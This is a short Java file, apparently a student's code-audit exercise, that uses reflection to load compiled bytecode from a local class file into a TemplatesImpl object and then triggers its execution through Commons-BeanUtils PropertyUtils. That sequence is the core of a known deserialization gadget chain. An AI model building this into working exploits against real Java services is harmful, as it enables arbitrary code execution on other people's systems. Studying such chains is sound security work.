import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.PropertyUtils;

import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

public class BeanTest {
    public static void main(String[] args) throws  Exception{
        Person person = new Person("aaa",18);
//       System.out.println(PropertyUtils.getProperty(person,"name"));
        TemplatesImpl templates = new TemplatesImpl();
        Class tc = templates.getClass();
        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"aaa");
        Field bytecodeField = tc.getDeclaredField("_bytecodes");
        bytecodeField.setAccessible(true);

        byte[] code = Files.readAllBytes(Paths.get("C:\\Users\\17140\\Desktop\\暑假实习\\java代码审计\\Cc1_test\\target\\classes\\Test.class"));
        byte codes[][]= {code};
        bytecodeField.set(templates,codes);

        Field tfactoryField = tc.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());
        //templates.newTransformer();
        PropertyUtils.getProperty(templates,"outputProperties");

    }
}
